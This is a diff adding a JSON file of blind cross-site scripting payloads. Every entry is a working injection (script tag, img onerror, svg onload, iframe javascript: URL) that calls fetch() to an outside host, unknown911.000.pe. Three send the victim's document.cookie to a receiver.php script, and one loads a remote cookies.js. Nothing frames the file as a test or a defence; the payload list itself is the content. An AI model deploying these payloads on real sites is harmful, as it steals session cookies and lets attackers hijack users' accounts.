@@ -1,0 +1,25 @@
+{
+  "payloads": [
+    {
+      "type": "basic_blind_xss",
+      "description": "Basic script fetching cookies",
+      "payload": "<script>fetch('http://unknown911.000.pe/receiver.php?data='+document.cookie)</script>"
+    },
+    {
+      "type": "img_onerror_blind_xss",
+      "description": "Blind XSS with image onerror fetching cookies",
+      "payload": "<img src=x onerror=fetch('http://unknown911.000.pe/js/cookies.js')>"
+    },
+    {
+      "type": "svg_onload_blind_xss",
+      "description": "Blind XSS with SVG onload fetching cookies",
+      "payload": "<svg onload=fetch('http://unknown911.000.pe/receiver.php?data='+document.cookie)>"
+    },
+    {
+      "type": "iframe_blind_xss",
+      "description": "Blind XSS via iframe using location.href",
+      "payload": "<iframe src=javascript:fetch('http://unknown911.000.pe/receiver.php?data='+document.cookie)>"
+    },
+    
+  ]
+}
